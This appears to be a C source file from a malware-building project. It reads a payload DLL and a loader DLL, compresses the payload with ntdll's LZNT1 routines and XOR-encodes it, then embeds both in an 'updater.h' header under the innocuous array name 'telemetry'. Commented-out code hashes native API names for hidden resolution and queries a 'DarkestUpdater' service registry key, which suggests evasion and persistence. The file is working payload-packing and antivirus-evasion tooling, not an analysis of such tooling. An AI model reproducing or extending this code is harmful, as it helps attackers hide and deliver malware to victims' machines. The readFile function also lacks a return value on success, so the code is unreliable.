//
// Created by mikul on 05.01.2026.
//

//#include <windows.h>
//#include <winternl.h>
//#include <stdio.h>

#include <stdio.h>
#include <windows.h>
#include "ntlib.h"
#include "library.h"

typedef NTSTATUS (NTAPI *_RtlGetCompressionWorkSpaceSize)(USHORT, PULONG, PULONG);
typedef NTSTATUS (NTAPI *_RtlCompressBuffer)(USHORT, PUCHAR, ULONG, PUCHAR, ULONG, ULONG, PULONG, PVOID);

NTSTATUS GetCompressedBuffer(PUCHAR srcBuf, ULONG srcSize, PUCHAR* outBuf, PULONG outSize) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    _RtlGetCompressionWorkSpaceSize fGetSize = (_RtlGetCompressionWorkSpaceSize)GetProcAddress(ntdll, "RtlGetCompressionWorkSpaceSize");
    _RtlCompressBuffer fCompress = (_RtlCompressBuffer)GetProcAddress(ntdll, "RtlCompressBuffer");

    ULONG workSpaceSize, fragmentSize;
    fGetSize(COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM, &workSpaceSize, &fragmentSize);
    PVOID workSpace = malloc(workSpaceSize);

    ULONG maxCompressedSize = srcSize + 1024;
    PUCHAR compressedBuf = malloc(maxCompressedSize);

    NTSTATUS status = fCompress(
        COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_MAXIMUM,
        srcBuf, srcSize,
        compressedBuf, maxCompressedSize,
        4096, outSize, workSpace
    );

    for (ULONG i = 0; i < *outSize; i++) {
        compressedBuf[i] ^= 0x3D;
    }

    if (status == 0) {
        *outBuf = compressedBuf;
    } else {
        free(compressedBuf);
    }

    free(workSpace);
    return status;
}

int GenerateHeaderFile(const char* filename, const char* arrayName, PUCHAR data, ULONG len, ULONG originalLen) {
    FILE* hFile = fopen(filename, "a");
    if (!hFile) return -1;

    fprintf(hFile, "#pragma once\n\n");
    fprintf(hFile, "// Original size: %lu bytes\n", originalLen);
    fprintf(hFile, "unsigned int %s_len = %lu;\n", arrayName, len);
    fprintf(hFile, "unsigned int %s_orig_len = %lu;\n", arrayName, originalLen);
    fprintf(hFile, "unsigned char %s[] = {\n    ", arrayName);

    for (ULONG i = 0; i < len; i++) {
        fprintf(hFile, "0x%02X", data[i]);
        if (i < len - 1) {
            fprintf(hFile, ", ");
            if ((i + 1) % 12 == 0) fprintf(hFile, "\n    ");
        }
    }

    fprintf(hFile, "\n};\n");
    fclose(hFile);
    printf("[+] Generated %s with %lu bytes.\n", filename, len);
    return 0;
}

int readFile(const char * path, __out PUCHAR * outBuffer, __out ULONG * size) {
    FILE *inFile = fopen(path, "rb");
    if (!inFile) {
        printf("Error: Could not open input file.\n");
        return -1;
    }

    fseek(inFile, 0, SEEK_END);
    long fileSize = ftell(inFile);
    rewind(inFile);
    unsigned char * buffer = (unsigned char*)malloc(fileSize * sizeof(char));
    fread(buffer, sizeof(char), fileSize, inFile);
    fclose(inFile);

    *outBuffer = buffer;
    *size = fileSize;
}

API_TABLE api;

int main() {
    /*
    const char *api_names[] = {
        "NtCreateKey", "NtSetValueKey", "NtQueryValueKey", "NtClose",
        "NtOpenKey", "NtWriteFile", "NtCreateFile", "RtlDecompressBuffer",
        "NtAllocateVirtualMemory", "NtFreeVirtualMemory", "RtlCopyMemory"
    };

    for (size_t i = 0; i < sizeof(api_names) / sizeof(api_names[0]); i++) {
        uint64_t hash = siphash24(api_names[i], strlen(api_names[i]), key);
        printf("0x%016llX, // %s\n", (unsigned long long)hash, api_names[i]);
    }


    HMODULE hModule = GetLibraryBase(L"ntdll.dll");
    ArchiveNativeAPIs(hModule, &api);
    void *pointer = QueryRegistryKey(
        nullptr, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\DarkestUpdater", L"ImagePath", &api);
    return 0;
    */

    const char * payloadFileName = "C:\\Users\\mikul\\Cat-and-mouse\\cmake-build-debug\\libPayload.dll";
    const char * stubFileName = "C:\\Users\\mikul\\Cat-and-mouse\\cmake-build-debug\\libLoader.dll";

    const char * outputPath = "C:\\Users\\mikul\\Cat-and-mouse\\updater.h";

    PUCHAR payloadBuff = nullptr;
    ULONG payloadBuffSize = 0;
    readFile(payloadFileName, &payloadBuff, &payloadBuffSize);

    PUCHAR stubBuff = nullptr;
    ULONG stubBuffSize = 0;
    readFile(stubFileName, &stubBuff, &stubBuffSize);

    u_char * comprBuff = nullptr;
    u_long comprBuffSize = 0;
    NTSTATUS compressionResult = GetCompressedBuffer(payloadBuff, payloadBuffSize, &comprBuff, &comprBuffSize);
    if (compressionResult != 0) {
        printf("Compression failed.\n");
        return -1;
    }

    GenerateHeaderFile(outputPath, "telemetry", comprBuff, comprBuffSize, payloadBuffSize);
    GenerateHeaderFile(outputPath, "loader", stubBuff, stubBuffSize, stubBuffSize);

    free(comprBuff);
    free(stubBuff);




    return 0;
}
